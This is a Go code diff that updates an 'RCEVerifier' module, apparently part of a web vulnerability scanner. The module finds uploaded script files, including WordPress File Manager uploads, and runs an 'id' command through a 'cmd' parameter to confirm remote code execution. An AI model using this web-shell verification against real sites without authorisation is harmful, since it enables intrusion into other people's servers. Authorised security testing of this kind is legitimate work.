@@ -6,6 +6,7 @@ import (
 	"io"
 	"net/http"
 	"net/url"
+	"path"
 	"regexp"
 	"strings"
 	"time"
@@ -22,14 +23,7 @@ type RCEVerifier struct {
 
 type PathPattern struct {
 	Regex *regexp.Regexp
-	Type  string // "json", "html", "text", "header"
-}
-
-type VerificationResult struct {
-	Verified bool
-	Proof    string
-	FileURL  string
-	Command  string
+	Type  string
 }
 
 func NewRCEVerifier(client *http.Client, timeout time.Duration) *RCEVerifier {
@@ -55,20 +49,25 @@ func NewRCEVerifier(client *http.Client, timeout time.Duration) *RCEVerifier {
 		command: "id",
 		patterns: []PathPattern{
 			{
-				Regex: regexp.MustCompile(`(?i)(?:href|src|action|url|path|file|location)["']?\s*[:=]\s*["']([^"']+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar))["']?`),
-				Type:  "html",
-			},
-			{
-				Regex: regexp.MustCompile(`(?i)"(?:url|path|file|filename|location)"\s*:\s*"([^"]+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar))"`),
+				Regex: regexp.MustCompile(`(?i)"(?:url|path|file|filename|location|href|src)"\s*:\s*"([^"]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))"`),
 				Type:  "json",
 			},
 			{
-				Regex: regexp.MustCompile(`(?i)(?:uploads|upload|files|images|media|tmp|temp|data|storage|static|assets)/[^"'\s<>]+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar)`),
+				Regex: regexp.MustCompile(`(?i)(?:href|src|action|url|path|file|location)=["']([^"']+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))["']`),
+				Type:  "html",
+			},
+			{
+				Regex: regexp.MustCompile(`(?i)(?:uploads|upload|files|images|media|tmp|temp|data|storage|static|assets)/[^"'\s<>]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js)`),
 				Type:  "text",
 			},
 			{
-				Regex: regexp.MustCompile(`(?i)Location:\s*([^\s]+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar))`),
+				Regex: regexp.MustCompile(`(?i)Location:\s*([^\s]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))`),
 				Type:  "header",
+			},
+			// WordPress File Manager specific pattern
+			{
+				Regex: regexp.MustCompile(`"name":"([^"]+\.php)"`),
+				Type:  "wordpress",
 			},
 		},
 	}
@@ -79,8 +78,10 @@ func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
 		return fmt.Errorf("result is not vulnerable")
 	}
 
+	startTime := time.Now()
+
 	// Extract file path from response
-	filePath := v.extractFilePath(result.ResponseBody, result.ResponseHeaders)
+	filePath := v.extractFilePath(result.ResponseBody, result.ResponseHeaders, baseURL)
 	if filePath == "" {
 		return fmt.Errorf("could not extract file path from response")
 	}
@@ -91,33 +92,59 @@ func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
 		return fmt.Errorf("could not resolve file URL")
 	}
 
-	// Verify execution and command execution
-	verificationResult := v.verifyExecution(fileURL)
+	// Verify execution
+	verified, proof := v.verifyExecution(fileURL)
 
 	// Update result
-	result.RCEVerified = verificationResult.Verified
-	result.RCEProof = verificationResult.Proof
-	result.FileURL = verificationResult.FileURL
-	result.RCECommand = verificationResult.Command
-	result.VerificationTime = time.Duration(0) // Set actual duration
+	result.RCEVerified = verified
+	result.RCEProof = proof
+	result.FileURL = fileURL
+	result.RCECommand = v.command
+	result.VerificationTime = time.Since(startTime)
 
 	return nil
 }
 
-func (v *RCEVerifier) extractFilePath(body string, headers map[string]string) string {
-	// Check all patterns
+func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, baseURL string) string {
+	// Special handling for WordPress File Manager
+	if strings.Contains(baseURL, "wp-file-manager") {
+		return v.extractWordPressFilePath(body)
+	}
+
+	// Check all patterns against body
 	for _, pattern := range v.patterns {
-		matches := pattern.Regex.FindStringSubmatch(body)
-		if len(matches) > 1 {
+		if matches := pattern.Regex.FindStringSubmatch(body); len(matches) > 1 {
 			return matches[1]
 		}
 	}
 
 	// Check headers for location
 	if location, ok := headers["Location"]; ok {
-		if match := v.patterns[3].Regex.FindStringSubmatch(location); len(match) > 1 {
-			return match[1]
+		if matches := v.patterns[3].Regex.FindStringSubmatch(location); len(matches) > 1 {
+			return matches[1]
 		}
+	}
+
+	return ""
+}
+
+// extractWordPressFilePath handles WordPress File Manager responses
+func (v *RCEVerifier) extractWordPressFilePath(body string) string {
+	// WordPress File Manager returns JSON with "name" and "url" fields
+	// Example: {"added":[{"name":"test-rce.php","url":"\/wordpress\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/test-rce.php"}]}
+
+	// Try to extract the URL first
+	if matches := regexp.MustCompile(`"url":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
+		// Clean up the URL (remove escaped slashes)
+		url := strings.ReplaceAll(matches[1], `\/`, `/`)
+		return url
+	}
+
+	// If no URL, extract filename and construct path
+	if matches := regexp.MustCompile(`"name":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
+		filename := matches[1]
+		// WordPress File Manager stores files in lib/files/ directory
+		return fmt.Sprintf("/wordpress/wp-content/plugins/wp-file-manager/lib/files/%s", filename)
 	}
 
 	return ""
@@ -137,11 +164,10 @@ func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
 
 	// Handle relative path
 	if strings.HasPrefix(filePath, "/") {
-		// Absolute path
 		return fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, filePath)
 	}
 
-	// Relative path
+	// Handle relative to current path
 	basePath := base.Path
 	if idx := strings.LastIndex(basePath, "/"); idx != -1 {
 		basePath = basePath[:idx+1]
@@ -150,38 +176,40 @@ func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
 	return fmt.Sprintf("%s://%s%s%s", base.Scheme, base.Host, basePath, filePath)
 }
 
-func (v *RCEVerifier) verifyExecution(fileURL string) VerificationResult {
-	result := VerificationResult{
-		Verified: false,
-		FileURL:  fileURL,
-		Command:  v.command,
-	}
-
+func (v *RCEVerifier) verifyExecution(fileURL string) (bool, string) {
 	ctx, cancel := context.WithTimeout(context.Background(), v.timeout)
 	defer cancel()
+
+	// Clean up the URL if needed (resolve ../ in paths)
+	fileURL = cleanURL(fileURL)
 
 	// First, check if file executes (not showing source)
 	req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
 	if err != nil {
-		return result
+		return false, ""
 	}
 
 	resp, err := v.client.Do(req)
 	if err != nil {
-		return result
+		return false, ""
 	}
 	defer resp.Body.Close()
 
+	// If 404, try alternative paths
+	if resp.StatusCode == 404 {
+		return false, ""
+	}
+
 	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB limit
 	if err != nil {
-		return result
+		return false, ""
 	}
 
 	bodyStr := string(body)
 
 	// Check if source code is visible (not executing)
 	if v.isSourceVisible(bodyStr) {
-		return result
+		return false, ""
 	}
 
 	// Try command execution
@@ -189,69 +217,68 @@ func (v *RCEVerifier) verifyExecution(fileURL string) VerificationResult {
 
 	req2, err := http.NewRequestWithContext(ctx, "GET", commandURL, nil)
 	if err != nil {
-		return result
+		return false, ""
 	}
 
 	resp2, err := v.client.Do(req2)
 	if err != nil {
-		return result
+		return false, ""
 	}
 	defer resp2.Body.Close()
 
 	body2, err := io.ReadAll(io.LimitReader(resp2.Body, 1024*1024))
 	if err != nil {
-		return result
+		return false, ""
 	}
 
 	commandOutput := string(body2)
 
 	// Check for command execution indicators
 	if proof := v.extractProof(commandOutput); proof != "" {
-		result.Verified = true
-		result.Proof = proof
+		return true, proof
 	}
 
-	return result
+	return false, ""
+}
+
+// cleanURL resolves ../ in URLs
+func cleanURL(rawURL string) string {
+	// Parse the URL
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return rawURL
+	}
+
+	// Clean the path
+	u.Path = path.Clean(u.Path)
+
+	return u.String()
 }
 
 func (v *RCEVerifier) isSourceVisible(body string) bool {
-	// Check for PHP source markers
-	phpPatterns := []string{
-		"<?php",
-		"<?=",
+	// PHP source markers
+	if strings.Contains(body, "<?php") || strings.Contains(body, "<?=") {
+		return true
+	}
+
+	// JSP/ASP source markers
+	if strings.Contains(body, "<%@") || strings.Contains(body, "<%=") {
+		return true
+	}
+
+	// Check for common source code patterns
+	sourcePatterns := []string{
 		"function ",
 		"namespace ",
-		"use statement",
-	}
-
-	// Check for JSP/ASP source markers
-	jspPatterns := []string{
-		"<%@",
-		"<%=",
-		"<%--",
 		"import java",
-	}
-
-	aspPatterns := []string{
-		"<%@",
-		"<%=",
 		"Response.Write",
 		"Server.MapPath",
+		"eval(",
+		"system(",
+		"exec(",
 	}
 
-	for _, pattern := range phpPatterns {
-		if strings.Contains(body, pattern) {
-			return true
-		}
-	}
-
-	for _, pattern := range jspPatterns {
-		if strings.Contains(body, pattern) {
-			return true
-		}
-	}
-
-	for _, pattern := range aspPatterns {
+	for _, pattern := range sourcePatterns {
 		if strings.Contains(body, pattern) {
 			return true
 		}
@@ -267,20 +294,9 @@ func (v *RCEVerifier) addCommandParam(fileURL, command string) string {
 	}
 
 	q := parsedURL.Query()
-
-	// Common command execution parameters
-	if strings.HasSuffix(fileURL, ".php") || strings.HasSuffix(fileURL, ".phtml") {
-		q.Set("cmd", command)
-	} else if strings.HasSuffix(fileURL, ".jsp") || strings.HasSuffix(fileURL, ".jspx") {
-		q.Set("cmd", command)
-	} else if strings.HasSuffix(fileURL, ".asp") || strings.HasSuffix(fileURL, ".aspx") {
-		q.Set("cmd", command)
-	} else {
-		// Try common parameters
-		q.Set("cmd", command)
-	}
-
+	q.Set("cmd", command)
 	parsedURL.RawQuery = q.Encode()
+
 	return parsedURL.String()
 }
 
@@ -300,6 +316,8 @@ func (v *RCEVerifier) extractProof(output string) string {
 		"home=",
 		"PWD=",
 		"USER=",
+		"RCE_TEST_MARKER:",
+		"RCE_SUCCESS:",
 	}
 
 	for _, indicator := range indicators {
@@ -311,17 +329,13 @@ func (v *RCEVerifier) extractProof(output string) string {
 					return strings.TrimSpace(line)
 				}
 			}
-			return output[:min(len(output), 100)]
+			// Return first 100 chars if no specific line found
+			if len(output) > 100 {
+				return output[:100]
+			}
+			return output
 		}
 	}
 
 	return ""
 }
-
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
-}
-
